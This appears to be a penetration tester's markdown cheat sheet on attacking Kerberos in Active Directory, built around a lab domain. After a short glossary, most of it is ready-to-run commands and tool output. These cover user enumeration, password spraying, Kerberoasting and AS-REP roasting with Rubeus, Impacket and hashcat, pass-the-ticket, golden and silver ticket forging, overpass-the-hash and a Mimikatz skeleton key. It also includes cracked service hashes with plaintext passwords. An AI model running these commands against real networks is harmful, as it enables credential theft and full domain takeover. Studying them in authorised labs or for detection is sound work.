# Kerberos Attack
*attacks:*
1.    Initial enumeration using tools like Kerbrute and Rubeus
2. Kerberoasting
3.   AS-REP Roasting with Rubeus and Impacket
4.  Golden/Silver Ticket Attacks
5.  Pass the Ticket
6.  Skeleton key attacks using mimikatz


## Common Terminology
-   **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
-   **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the `Authentication Service and the Ticket Granting Service`.
-   **Authentication Service (AS)** - The Authentication Service issues `TGTs to be used by the TGS` in the domain to request access to other machines and service tickets.
-   **Ticket Granting Service (TGS)** - The Ticket Granting Service `takes the TGT and returns a ticket` to a machine on the domain.  
    
-   **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
-   **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the `KRBTGT service account`. It is used to `encrypt the TGT and sign the PAC`.
-   **Client Long Term Secret Key (Client LT Key)** - The client key is based on the `computer or service account`. It is used to `check the encrypted timestamp` and `encrypt the session key`.
-   **Service Long Term Secret Key (Service LT Key)** - The service key is based on the `service account`. It is used to `encrypt the service portion of the service ticket and sign the PAC`.
-   **Session Key** - Issued by the `KDC` when a `TGT is issued`. The user will provide the `session key to the KDC` along with the `TGT` when `requesting a service ticket`.
-   **Privilege Attribute Certificate (PAC)** - The PAC holds all of the` user's relevant information`, it is `sent along with the TGT to the KDC` to be `signed by the Target LT Key` and the `KDC LT Key in order to validate the user`.



## TGS contents
-   **Service Portion**: `User Details, Session Key, Encrypts the ticket with the service account NTLM hash`.
-   **User Portion**: `Validity Timestamp, Session Key, Encrypts with the TGT session key`.


![[Pasted image 20211210103921.png]]


### Kerberos Authentication Overview 

   ![[Pasted image 20211210104409.png]]

- **AS-REQ - 1.)** The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).

- **AS-REP - 2.)** The Key Distribution Center verifies the client and sends back an encrypted TGT.

- **TGS-REQ - 3.)** The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.

- **TGS-REP - 4.)** The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.

- **AP-REQ - 5.)** The client requests the service and sends the valid session key to prove the user has access.

- **AP-REP - 6.)** The service grants access



## Attack Privilege Requirements -

-   Kerbrute Enumeration - No domain access required 
-   Pass the Ticket - Access as a user to the domain required
-   Kerberoasting - Access as any user required
-   AS-REP Roasting - Access as any user required  
    
-   Golden Ticket - Full domain compromise (domain admin) required 
-   Silver Ticket - Service hash required 
-   Skeleton Key - Full domain compromise (domain admin) required



### Kerbrute Enumeration (No domain access required)

*abuse the Kerberos pre-authentication*

**Nmap**

```bash 
nmap -verbose 4 -p 88 --script krb5-enum-users --script-args krb5-enum-users-realm='kerbrealm',userdb=user.txt <dc ip>

```

**Kerbrute Installation**

1.) Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)[](https://github.com/ropnop/kerbrute/releases)

2.) Rename kerbrute_linux_amd64 to kerbrute

3.) `chmod +x kerbrute` - make kerbrute executable


```bash


root@kali:~/AD# ./kerbrute userenum  --dc 10.10.137.140  -d CONTROLLER.local User.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 12/10/21 - Ronnie Flathers @ropnop

2021/12/10 08:16:49 >  Using KDC(s):
2021/12/10 08:16:49 >   10.10.137.140:88

2021/12/10 08:16:49 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2021/12/10 08:16:49 >  [+] VALID USERNAME:       user2@CONTROLLER.local
```


### Harvesting & brute-forcing ticket(Access as any user required)

[Rubeus](https://github.com/GhostPack/Rubeus)

```Rubeus.exe harvest /interval:30```

*password spray*
```Rubeus.exe brute /password:Password1 /noticket```




### Kerberoasting - (Access as any user required) 

**Tools**
- Rubeus
- impacket
- keko
- Invoke-Kerberoast

*Cracking*
- hashcat
- tgsrepcrack.py  (kerberoast)


***Rubeus***
```bash
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe  kerberoast 

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0 


[*] Action: Kerberoasting 

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 
                                                                             
[*] Searching the current domain for Kerberoastable users                    

[*] Total kerberoastable users : 2 


[*] SamAccountName         : SQLService                                     
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local  
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111 
[*] PwdLastSet             : 5/25/2020 10:28:26 PM                          
[*] Supported ETypes       : RC4_HMAC_DEFAULT                               
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$020D89450AB646C732A0D2D5F274FC55$2C009D000CE7172EE3043917ABE708948BD4EC 
                             E987B18487E9F03C6B2400FCC5B4259B6DB622E5F5EB1D1ED03ADE08D1A9FDE78750A4227EFF7E66 
                             30E3544C922F6CA62CFB4B10D9FA90991ED7FA508A9A172DEE6B8A5B829FBBC8883D31F25E4648C1 
                             37CEABBE4E18E5D73DF06AB770EC4061ABD712465308A046C968445E92BB474FEF4B29B34320FCCA 
                             031735F65030D6EE4DB61E71B9F225F3D3785F0E3CC5842B5553697A11A79B80D7DEE51979814724 
                             55E87672BF9D95F2210A720A3C69770CD643EC7794E05D206F5294268135505B637B57414F6F8BB8  
                             1F60A46E1756A470C911A04B8596746A625B28B3B9FFBBAC7D0C6EF9D636AD5E91F34BEACE02EF86  
                             DE84FF526ED6C09D58C1F6B4EFF72CFD21505018CB32645B0391E67BFE69B840C089AB8EF3E8E16C  
                             6FADF07FBF219C7949E62C3D22AF4D4A5376EC880A7004C93C734CEED9EF565EC8CA2546F148A603  
                             AEA3E2C038AC6828214942AD89E23DD1D8EFBFE7B09872772AE04F58B2C4BAE67EEAA478FE7BA787  
                             99634149675FF35DA82F9EB638D2412261EFFF068BFFCC2A4982E003C87A761C2072C7E97EF07AC4  
                             DBC597023CA0DDFB6D177F1679E115FB385E923CB79DA8B2D8157C9BEE981C6650D4D739019E521A  
                             E4C908A59607144B0363605280DD8DCA9D963595CE7082DFDF56704040817942D48B2933DD0D04F8  
                             204B08902564459E673F75E40C295B4FB8F7828B962800A5E27BE3AEFFE34568342C4066934106E2  
                             63BE0F3309CBD76F2550642C48F510A01F4ADBEF6D2EE55DEAD7D91298441F09F09677038BE4E8F3  
                             FA9A8F00941586DC6FA5482F1262D8806458F665E99D5DDAB5D780D3CC173E9BE2D88CA465A9D68F  
                             AE8D2C9889A50F52CF052ED6294EE03ED698FA7A75C02EED185E4FD384AC4A48FEA825256B9A90D2  
                             9C43DF669D2C45362DCC6387029372FAD13BC59908502713542B0F621ABBC52868CE2DD74029C652  
                             1136A96943766D17BC9BA872B2208505CAC9AC876C450B5B3752395E96825A8C6E729A599579FC27  
                             97E20BAB15018E54A7B4D490700B7F3A325F218E7D8BDA13CA99046B20B26A342D7CEE0AFF47D06A  
                             C338A330313541E3CBE7607B52AC5137CC37253F63F09160EDD295C8F67418F3A1EC3423B169649D  
                             025BD85D7FEF957FED23824B9F00713738DF04A57D02510F09F4E05EE88735CF7A7625438F41F760  
                             AFAC78D172B6D8A8429A9486F3FD81FF13CAD25BFDE47237AA2D23D070D2B141A425BCCF52947CF2  
                             33717D24EF7A2947D365D72B1D9EE17858945EE519CD28C34DA1926A28C052656B3254613E69E020  
                             2CAB0D16D67225885803A72D26EEDBCFC33B931E652A249A80004B6D6F0D569A52BCD6D25460C852  
                             E3B744D70B20FFA10E5C94EECE68C9499BAB4131A14137BF9269189D09061A905CE2624D5916E9DB  
                             707159669C0DE95DD35AD9956C44831B7A31047372926F5E4CBD6A842B02EBC4E7BBD071073D91E2  
                             F6B750B12886260BD29EC51287D45C0DF435BEF5E92A6981117DC69714DF642EBC519F9A7492105F  
                             151C40BD262727AFB3A93BA66F67A9A6050D55C953EB844B5DE708BB21B371975CA39C15B5915294  
                             86423D60E1A3B3858D388BBEEDDA4F6C77BAA4F29B3C38E05950B54184


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo  
                             cal:30222*$81E61E64B7C03FCD2A96941BE187EDFB$E76B10DB0F52108B598A62849B42710A0B63  
                             7D4F7470025A031B36F3D81E982A3F3D65003080CD051D25A61E42B3C18D57C1AC36EE12ABAB943F  
                             D15D10C8939244301AF71644F71835FB100A1477F44B6CD78613E9BF30453E41FE0D5E1F1C730EB7  
                             7C3AA00E7BDC0653B31B6C8942602B20B6328C49C68A1DD399117B6ACE51DB6BD384EC71E87DB303  
                             4AFEAD6D5A519006F78D008FA627AA395F082CE39A7CFB2D30037568CF0F3F774256E00DD1DFFB98  
                             BAB822D11BAE1DDA7B0AEF7A6E5DE7DEFF0A759DE3CD9B304919FB1584F8517123AC5320CC23F0D1  
                             70C733A2543213DD1675C58894DD0EB51BEF1252F3E78AF2386E7E8F3504ED1D969DD0F8A4EA51D2  
                             F037B477D31EB97D26951F4F04B1FC7B0C47D70221720DE1F979D49A6D36403C39D5DF8B04F852D7  
                             0A85D24584CAB533CFF2B1223943373D9FC4BD2ED798207B5177637B21B9A135D184661BDE86B998  
                             7CE13092DB53F4C31B4BF6B1D37ADED29505AC355F00FA9050734BEEDDB3DBFE1A99D2E0EAB94F0D  
                             91B3E0041321033DB491363C8D66686525291F7ED542A37CA047520B2A90547985E3C577BC94BCDA  
                             831F7E21A6927C0C2CFEED5CC804A7A7317698D56B475DD95D3BD21FA029450F565ACAB6DA3E1002  
                             CE3CCA5CEDA88E1121799DDCAC4C163DFAEFE55996E2206F8267ED68914A92885F24667089DEEE3A  
                             84EC7C024480288B1215A32E741290FAA1D40AE30ED949870D2775848D76FD437582B147FEB4FE35  
                             3C3F532CFE4A83A2F3B4765A5FAD47C44AD1B01C7CF8419E1F8E002162ED4B396F624DC5C5DB4D83  
                             2FD87F5B515B0DF4E99E3BD1E11901728E98B9460F9E7E21AF37252DB93C155EE4333C01823CC624  
                             34DEAB88E94BF62990BFEAA56A2EE1E6689EE7F3021955205A2222A8F324F83CBE3F56006685A7CC  
                             C483C76E6E661EDC33CDC822FC3660786C118EC81DAC3CC27AFD0452FB38C189EB9BEF519E5FFB45  
                             F627AEA80B3675CA68CA5088075873199269B67E6EFAD8C36CA8F4A3E0074CF9AC655970C310487E  
                             EEB087579698FC67CAE4BB7D96AE365A9195823070EB5396241BF1F06D66FE69EFD22C7E7C5E0CDE  
                             206E766AB3929BB1592FF3841AF063AAC775344D0DE5CCF32AD1EDDF0866AF1E6DF77209EE833805  
                             A7AB0878180F10BC9CE0FD385F79A26C5E46B3261BDA7760189FACAF45F15E89A478205E49B101BE  
                             4A301E875713F16D4DF1BBE40857026CF3A0C8A83471FBF488905DE554677C544CBDB72D1C0F9455  
                             1D85CBFBED1849E42A72C46E654894153C4D6657C4EE4B9D0539A7EF3720B37D714D9AC908820AC2  
                             B2AFCC07C8301745E5F2BE8A573B2A5BE2C615103B435C8676FCA606ED1A9E792BE63E85E1FEAEC8  
                             4409044BD0B6DBDB0F1CABD04F4637756644B4E1AB5B245AF975B1D44954FA4A97E3C6B6BD2C043C  
                             22A2C7DD5E449AD70E0608DA2810FD6CDFB3F8B1C7090223E3C3D6B93229056E998EC45E07710683  
                             4C8947A7AA64105D01D25A53F2B972FE3F52F4D3507D643E9E2B4B74B7EFD0040F03BD7397C8A7D6  
                             0A773323CA41CC09DCF7B69EF105DE4F9C82AC1561CB968C722B62268CDC8C3E1EFF47CEC3CB4715  
                             51CF1FEAA791FDD3975F8F86277AFDAAF5AC0E5233205EA55B124402190C


```



**Impacket**

*install*

1.) `cd /opt` navigate to your preferred directory to save tools in 

2.) download the precompiled package from [https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19)

3.) `cd Impacket-0.9.19` navigate to the impacket directory

4.) `pip install .` - this will install all needed dependencies



*RUN*
```bash
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.137.140 -request
```






**Hashcat Crack**

```bash

hashcat -m 13100 -a 0 ker Pass.txt

$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$7d64b47cdbebfbbbaac15488ed3e934a$4ab704d4e2929479b39e84d91b6ac291659ac164030c378fce661fcb453dbe5d23d8d85df5cad5097e780b5d6df39d49ae06ccacd9b8b8b48ba90d0ecacf29199745b391e8bc158e3970e738b6a34bc949309537928899f75895e3488f7908516490f26b184c811cb902bf512b927a8f102f64cba3aae97154c0d7039a61c40e2cbc7ecc9de2023ebad19f6028ef4d96f34acd314d433bd441859cf45f649b36bd5a85371541b1d6826fce8401a601d2efd39a9b607a8145db689fb843b91ee1fa3af8e5dd56cfd4a389e039de529b7f83e34e18065eea717a28764a0fb72f7ed44fbeb7429d1a67ba7320845d0303b40f68cef2cc2de84191e418e78237ea065f1e234b2030c50830090d718d6f3f65ad3931803ebf09c64b25ba78ddd8fa0893b6bd92a912802d577478c811c0d34adf37d6f55326a687ffcdb5430b6cbe6c3656ce7113d87bc1694977e555fe3020618c532a429c4020d59dc1c46983a8d609b1041d2e63e091ac0d6f1124bdca2a731e04003a922d6b3242f9ddb2d12e5fa538fccc8bf3994b11a2b093ddbdd30d5e36167bf89cbc40b18344244c3d15f31c3ecf352ec82a614880e0312cffca5b88f65dc2116a1eec0e8733b147306632c67d3c8b4ee8fb0f5e005cc35c72dd4f7b7d1c999fb0c06407fac4e69d4ffd3fc9dabfed517fb1f6e5324e9ff68763bd5db04525b6fc1fdff81076cbdcde77176fac8c8005683cfc2d55abfb072f37b45c2d4b9b030fd9fa918890be3afdcbdecd31096c84cf9489b5c5022b3d7872ab0fc21603716e09dedfd5c12b6e624b1c97a5875e41ec555552c4ad75a6291dc8ea7da780cfdd97629fb1bf5988274bb01f1931c846f2faa2a1316537465980b4b89e8ee73d687f207ef0bbb7b7bd8aef6feebaca1acf3f3ef8e9085f2b41b40af0ff591d36d544b9ee591d863161194c841e870ea3aecf13043bc176d4ccca0df6850ac7a8de9a0971ea3d95a333289c10e1e19994fe3f9df583db8574eaf75231fdfae7d46f00dec1bfed4150734a71650447e11b5c8ba563a3dc0bea5315643a7c742bf43751a32bae763f826f550646a38c878fafd8d0bafe2cafddcfd169705964e38ffdc25370bcbcaf3ced83e95b1461be0d7516fa6465c0501a5fb991b6828b9c878862e66f94ad42b1db5016b210f569606ef8a48a09d2d656a92c3adaea4201ceb2b32cdc1dbcbecbc6e1a7ee38fc7e2d2032a93c48d9bf278ec9b3f06812d1206034004b439a8c36e510d4b297fb71fa6b575d91e27e4837f175c6f17d9316ed09162de6b5aec3304cf0884a16ea7f71826142298595ecbb844a7de90f725eb65e14a0e906b7afdf2692112c57808cf0629c2cf5bcbb558e98d3a015:Summer2020
$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$88866f942649e35e11caf66a4fa06dfc$e301ee96a6d822b15a6fb68e74bad07f8e1e27708666ac9acc3de5100a8cb5fb961eb951a583e36228bc687ffcb083ac8984f9345c4a63013e7dd432e707f65b9b6b58245770c563c453f10301eee67a0ef51ce19648abadde7635b4138e892bd38f1f8d9e15aa45767c42f828c1bc9e933e8f68860c928488222ad05e17c538e643fc9e0860a5a70dde582f1b1f70a37d03f8050990d19f4f984bf60d87d30d935a99319f4b0e0652a9c08424bbbefe7dd17fa15b2d342d0967ac280a253e4ecd9409603cea3fa05db750ec72bb991fe16815772f6d4237a972c08835a238c392eabe6a3c4d79e54bc9950306987023f7d5c2659d8c8b336095b38c36c3fe6118950c38105cecd265d355301d914d232063d1e38215fff317ed04e56b35cab7e7a00900b03fb8f4525c1803ed38c79fc8494320c0a94f00ea9a5d05c4d6cee9ffca4e1dd076b5e03fbebc4ffb061e9d5d7d90c247828cbde3609b0336f07f234621620be3c41a63cd9d296a3d246a73f6f84f1c7e20afc1b9daab2eefb85cadf733878a687fb7c22b82deb49690bdab65c6397f65ee12034df0a79b873e27f5b55cd9bc0698e2c3e30ebeb8d6a78ec57f75e47e93a683f672e14796e5be83377e1c9d3cce9303b613d9d0b95acc9b70352fe65a94a8ef563744b2d68c209102c9645b3b712bb7d8f376fd519c3b1065f338edf991f26993eb59da93f616e0af7f5f6a65d9ee2c2c25e70112aa87c6aa373219695abcfecab90f3029b1f769273e8ead2f638bb48c9256e2fd46421ddc9660aaffe2728b1c3e221c1739f075d6a8ea838255f4ac7bb5273e13637f377f2a421d531203d139ee7583b0e14480f1b970e39ccd7ccbbf741492b4044e6a39895e22ebca8ff3b6a02c05802c1e39002be245804576b646ad1e1e2a263aee4ba077085c3b648481cd145ac1bf89a5522d1387af648d6a0ce695f4e08d4de954438a87a814586d81fb3d483cfa1647239599079557f82541cfd8b1beb5c16d0b1640f4c98b9e47829b1ceeddd32a9c01b488400d090fcfb899ae1b399807811437ac6d60d8c560ff065ff2bacd4f29ef14113ee642275219f586b419b324e16a33558c466a54cd56fadbd1fe26181952b0e2e8184d8c711b447380f93fec66e09c0461b72e505c830a8e1c1ef8840aa4643be248dcf54f0ecb24356711924629bf05bec90ba623c621b1bff7fdb823c60b0dd6141d9c90bb8ef3094a3835202b7779554194af5af7d0f138e9c9fe150a4fb212e5f14792cc31c6cf200be92cad9d69cf563e16f91135d1bf313c5d52fccf36955323c61afd4aac006ca60601bc7e75b09d24fedaa18cccc697f21a150bda4c6cbdc74f215dc16323392c15b3231c:MYPassword123#
```





### AS-REP Roasting  (Access as any user required)
*** user accounts that have Kerberos pre-authentication disabled***
*Tools*
*Rubeus*

```bash
Rubeus.exe asreproast
```
![[Pasted image 20211210213638.png]]


*GetNPUsers*

```bash

 python3 GetNPUsers.py test.local/ -dc-ip 10.10.10.1 -usersfile usernames.txt format hashcat -outputfile hashes.txt
    
```


*Crack hash*

```bash
hashcat -m 18200 hash.txt Pass.txt
```


### Pass the Ticket (Access as a user to the domain required)

*TOOLS*

- mimikatz
```text
privilege::debug
sekurlsa::tickets /export
kerberos::ptt <ticket>

```



###  Golden Ticket (Full domain compromise (domain admin) required)

*TOOLS*
- Mimikatz


```bash
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id
```


/user account name
/domain domain name
/sid security identifier for account
/krbtgt NTLM hash from administrator 
/id ID for account (500) high 

```bash
kerberos::golden /user:administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:2777b7fec870e04dda00cd7
260f7bee6 /id:500
```

`misc::cmd` - this will open a new elevated command prompt with the given ticket in mimikatz.


### Silver ticket (Service password hash)

*TOOLS*
- mimikatz

/user account name
/domain domain name
/sid security identifier for account
/target  fully qualified host name of the service
/service service type
/rc4 password hash for service 
/ptt injected in memory



```bash

kerberos::golden /user:sqlservice /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /target:SQLService.CONTROLLER.local:1433 /service:MSSQLSvc /rc4:cd40c9ed96265531b21fc5b1dafcfb0a /ptt
```



### Overpass the hash(access to PC join to PC) 

*TOOLS*
- mimikatz



```bash
sekurlsa::logonpasswords

sekurlsa::pth /user:Administrator /domain:controller.local /ntlm:2777b7fec870e04dda00cd7260f7bee6 /run:PowerShell.exe


```



### Skeleton Key (Full domain compromise (domain admin) required)

*TOOLS*
- mimikatz

```bash
privilege::debug
misc::skeleton

```




#### Resource
[How To Attack Kerberos 101 ](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
[Active Directory (AD) Attacks & Enumeration at the Network Layer - Lares](https://www.lares.com/blog/active-directory-ad-attacks-enumeration-at-the-network-layer/)
[Detecting Kerberoasting Activity – Active Directory Security (adsecurity.org)](https://adsecurity.org/?p=3458)
[Attack & Detect — Kerbrute / Active Directory User Enumeration | by Domdalcerro | Medium](https://medium.com/@domdalcerro/attack-detect-kerbrute-active-directory-user-enumeration-2b63b2d16c3a)
[WADComs](https://wadcoms.github.io/)
[Kerberos (II): How to attack Kerberos? (tarlogic.com)](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
[Active Directory Exploitation Cheat Sheet (awesomeopensource.com)](https://awesomeopensource.com/project/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
[Explain like I’m 5: Kerberos – roguelynn](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)
[Blog - Coding Towards Chaotic Good - harmj0y](http://www.harmj0y.net/blog/blog/)

-   [https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)[](https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a)
-   [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)[](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
-   [https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)[](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1)
-   [https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)[](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
-   [https://www.varonis.com/blog/kerberos-authentication-explained/](https://www.varonis.com/blog/kerberos-authentication-explained/)[](https://www.varonis.com/blog/kerberos-authentication-explained/)
-   [https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)[](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf)
-   [https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)[](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf)
-   [https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf](https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf)